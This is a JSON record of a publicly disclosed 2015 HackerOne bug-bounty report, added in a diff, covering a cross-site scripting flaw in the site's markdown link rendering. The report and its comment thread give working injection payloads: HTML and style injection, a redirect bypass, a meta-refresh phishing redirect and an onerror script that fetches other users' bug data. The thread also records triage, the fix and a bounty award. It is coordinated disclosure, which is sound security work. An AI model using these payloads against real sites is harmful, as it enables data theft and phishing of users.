@@ -1,0 +1,399 @@
+{
+    "id": 46072,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NjA3Mg==",
+    "url": "https://hackerone.com/reports/46072",
+    "title": "Vulnerability with the way \\ escaped characters in <http://danlec.com> style links are rendered",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2015-02-01T23:52:18.498Z",
+    "submitted_at": "2015-02-01T23:52:18.498Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "danlec",
+        "url": "/danlec",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 13,
+        "url": "https://hackerone.com/security",
+        "handle": "security",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "HackerOne",
+            "twitter_handle": "Hacker0x01",
+            "website": "https://hackerone.com",
+            "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2015-02-03T17:34:45.891Z",
+    "bug_reporter_agreed_on_going_public_at": "2015-02-03T17:34:45.035Z",
+    "team_member_agreed_on_going_public_at": "2015-02-02T19:07:05.856Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "> <http://\\<div\\ style=\\\"font-size:24px;background:red;color:white;width:100%;height:48px;line-height:48px;text-align:center;\\\"\\>Uh\\ oh!</div\\>>\r\n\r\n## Basic POC:\r\n\r\nSequences like `<http://\\<h1\\>test\\</h1\\>>` are rendered as `http://<h1>test</h1>`\r\n\r\n## Examples of what could be done with this:\r\n\r\nObviously there's a whole variety of stuff that can be done when you can inject arbitrary HTML, even in spite of the CSP protection.\r\n\r\nWe can put in elements we're not supposed to (see above, where we've inserted an attention grabbing `div`)\r\n\r\nWe can put in \"arbitrary\" images (i.e. profile pictures)\r\n\r\n```\r\n<http://\\<img\\ src=\\\"https://profile-photos.hackerone-user-content.com/production/000/000/013/76b3a9e70495c3b7340e33cdf5141660ae26489b_large.png?1383694562\\\"\\>\r\n```\r\n\r\n> <http://\\<img\\ src=\\\"https://profile-photos.hackerone-user-content.com/production/000/000/013/76b3a9e70495c3b7340e33cdf5141660ae26489b_large.png?1383694562\\\"\\>>\r\n\r\nWe can put in our own `<style>` tags, e.g. using\r\n\r\n```\r\n<http://\\<style\\>.markdownable\\ blockquote{color:white;border:0;padding:0;margin:0;}a{color:red !important}\\</style\\>>\r\n```\r\n\r\n> <http://\\<style\\>.markdownable\\ blockquote{color:white;border:0;padding:0;margin:0;}a{color:red\\ !important}\\</style\\>>\r\n\r\n## Serious Exploits\r\n\r\nWe can bypass HackerOne's link /redirect:\r\n\r\n```\r\n<http://\\<a\\ href=\\\"http://danlec.com\\\"\\>Redirect\\ bypassed\\</a\\>>\r\n```\r\n\r\nIf we wanted to be particularly sneaky, we could use CSS to make a link cover the whole submission, so clicking anywhere would activate the link … which might allow us to do some phishing by having the link go to a fake HackerOne login screen.\r\n\r\n> <http://\\<a\\ href=\\\"http://danlec.com\\\"\\>Redirect\\ bypassed\\</a\\>>\r\n\r\nFor browsers without good CSP support, like IE11, we can use this to run script on a victim when they try to view our submission using\r\n\r\n```\r\n<http://\\<img\\ style=\\\"display:none\\\"\\ src=0\\ onerror=\\\"alert(\\'Uh\\ oh\\')\\\"\\>>\r\n```\r\n\r\n> <http://\\<img\\ style=\\\"display:none\\\"\\ src=0\\ onerror=\\\"alert(\\'Uh\\ oh\\')\\\"\\>>\r\n\r\n(If you're using IE11 for some reason, you'll get an alert when you view this submission)\r\n",
+    "bounty_amount": "5000.0",
+    "formatted_bounty": "$5,000",
+    "weakness": {
+        "id": 60,
+        "name": "Cross-site Scripting (XSS) - Generic"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [],
+    "allow_singular_disclosure_at": "2015-03-04T19:07:06.642Z",
+    "allow_singular_disclosure_after": -267801179.86260813,
+    "singular_disclosure_allowed": true,
+    "vote_count": 16,
+    "voters": [
+        "zzero",
+        "dirk",
+        "sw33tlie",
+        "inhibitor181",
+        "spam404",
+        "ali",
+        "xsam",
+        "karel_origin",
+        "r3y",
+        "khizer47",
+        "and 6 more..."
+    ],
+    "severity": {
+        "rating": "high",
+        "author_type": "Team"
+    },
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 322415,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I've verified that something like the following works in submissions viewed in IE11, and would have the possibility of giving unauthorized access to other bug descriptions\n\n```\n<http://\\<img\\ src=0\\ onerror=\\\"$.getJSON(\\'/bugs\\',function(a){alert(JSON.stringify(a));})\\\"\\>>\n```\n\nI expect you could also include these things in bug reports that are then made public, allowing you to potentially get unauthorized access to data from researchers.\n\n",
+            "automated_response": false,
+            "created_at": "2015-02-02T00:06:07.442Z",
+            "updated_at": "2015-02-02T00:06:07.442Z",
+            "actor": {
+                "username": "danlec",
+                "cleared": false,
+                "verified": false,
+                "url": "/danlec",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 322517,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "It also appears that this same attack works in the markdown for program descriptions, and in both cases (descriptions and bug reports) you could use something like\n\n```\n<http://\\<meta\\ http-equiv=\\\"refresh\\\"\\ content=\\\"0;\\ url=http://danlec.com/\\\"\\>>\n```\n\nto cause the page to redirect immediately when loaded… which could also be used in a phishing scheme.",
+            "automated_response": false,
+            "created_at": "2015-02-02T08:33:27.553Z",
+            "updated_at": "2015-02-02T08:33:27.553Z",
+            "actor": {
+                "username": "danlec",
+                "cleared": false,
+                "verified": false,
+                "url": "/danlec",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 322562,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Hey @danlec,\n\nThank you for your report, we were able to reproduce this (nice PoC by the way), and we are looking into this issue. \n",
+            "automated_response": false,
+            "created_at": "2015-02-02T10:11:57.985Z",
+            "updated_at": "2015-02-02T10:11:57.985Z",
+            "actor": {
+                "username": "dirk",
+                "cleared": false,
+                "verified": false,
+                "url": "/dirk",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 322603,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "> http://<div style=\"font-size:24px;background:red;color:white;width:100%;height:48px;line-height:48px;text-align:center;\">Fixed</div>\n\nHey @danlec,\n\nWe've deployed a fix, and as you can see the bug has been squashed. Could you check if you agree?",
+            "automated_response": false,
+            "created_at": "2015-02-02T12:12:02.774Z",
+            "updated_at": "2015-02-02T12:12:02.774Z",
+            "actor": {
+                "username": "dirk",
+                "cleared": false,
+                "verified": false,
+                "url": "/dirk",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "reporter": {
+                "username": "danlec",
+                "url": "/danlec"
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 322608,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey dirk!  Yes, as far as I can tell this issue has been resolved.  Thanks for the quick response :)",
+            "automated_response": false,
+            "created_at": "2015-02-02T12:17:42.588Z",
+            "updated_at": "2015-02-02T12:17:42.588Z",
+            "actor": {
+                "username": "danlec",
+                "cleared": false,
+                "verified": false,
+                "url": "/danlec",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 322813,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "HackerOne's first XSS! Even though this only leads to a direct same origin violation in clients that do not support a `Content-Security-Policy`, this was a wonderful find. It is the first report to reach our **[Severe](https://hackerone.com/security)** categorization. Thanks @danlec!",
+            "automated_response": false,
+            "created_at": "2015-02-02T19:06:58.923Z",
+            "updated_at": "2015-02-02T19:06:58.923Z",
+            "actor": {
+                "url": "/security",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "HackerOne"
+                }
+            },
+            "bounty_amount": "5000.0",
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "security",
+            "collaborator": {
+                "username": "danlec",
+                "url": "/danlec"
+            }
+        },
+        {
+            "id": 322814,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2015-02-02T19:07:05.906Z",
+            "updated_at": "2015-02-02T19:07:05.906Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "arice",
+                "cleared": false,
+                "verified": false,
+                "url": "/arice",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 323493,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "For those seeing this report after the fix has been deployed, attached is a screenshot of this report before we resolved the issue, clearly showing the proof of concept in action.",
+            "automated_response": false,
+            "created_at": "2015-02-03T12:17:31.298Z",
+            "updated_at": "2015-02-03T12:17:31.298Z",
+            "actor": {
+                "username": "dirk",
+                "cleared": false,
+                "verified": false,
+                "url": "/dirk",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "attachments": [
+                {
+                    "id": 28409,
+                    "filename": "screen_shot_2015-02-02_at_10.58.31_(2).png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/028/409/690f0ec0dc5a31fbaa796b4ee0d924dfa20b4c7e/screen_shot_2015-02-02_at_10.58.31_%282%29.png?response-content-disposition=attachment%3B%20filename%3D%22screen_shot_2015-02-02_at_10.58.31_%25282%2529.png%22%3B%20filename%2A%3DUTF-8%27%27screen_shot_2015-02-02_at_10.58.31_%25282%2529.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T082006Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=d9cd8ef253c1b472dd60e31efe86ea120dcf514c8c42c3b0dd2796d1eb6e161c"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 323628,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Thanks for the bounty, the kind words, and for running a great service!  \n\nI've written a bit about this issue at http://danlec.com/blog/hackerones-first-xss",
+            "automated_response": false,
+            "created_at": "2015-02-03T17:34:45.075Z",
+            "updated_at": "2015-02-03T17:34:45.075Z",
+            "actor": {
+                "username": "danlec",
+                "cleared": false,
+                "verified": false,
+                "url": "/danlec",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 323629,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2015-02-03T17:34:46.074Z",
+            "updated_at": "2015-02-03T17:34:46.074Z",
+            "actor": {
+                "username": "danlec",
+                "cleared": false,
+                "verified": false,
+                "url": "/danlec",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 1248053,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2016-10-14T18:16:19.245Z",
+            "updated_at": "2016-10-14T18:16:19.245Z",
+            "additional_data": {
+                "old_severity": null,
+                "new_severity": "High",
+                "old_severity_id": null,
+                "new_severity_id": 2202
+            },
+            "actor": {
+                "username": "arice",
+                "cleared": false,
+                "verified": false,
+                "url": "/arice",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
